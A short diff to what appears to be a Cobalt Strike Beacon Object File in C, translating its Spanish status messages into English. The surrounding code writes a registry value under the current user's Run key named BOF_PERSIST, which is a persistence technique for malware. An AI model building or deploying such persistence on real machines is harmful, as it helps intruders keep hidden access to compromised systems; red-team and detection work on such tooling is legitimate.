@@ -35,7 +35,7 @@ void go(char *args, int alen) {
     );
 
     if (result != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA falló: %ld\n", result);
+        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExA failed: %ld\n", result);
         return;
     }
 
@@ -50,11 +50,11 @@ void go(char *args, int alen) {
     );
 
     if (result != ERROR_SUCCESS) {
-        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA falló: %ld\n", result);
+        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExA failed: %ld\n", result);
         ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
         return;
     }
 
     ((LONG(WINAPI*)(HKEY))__imp_RegCloseKey)(hKey);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Valor de registro creado/actualizado: HKCU\\...\\Run\\BOF_PERSIST\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry value created/updated: HKCU\\...\\Run\\BOF_PERSIST\n");
 }
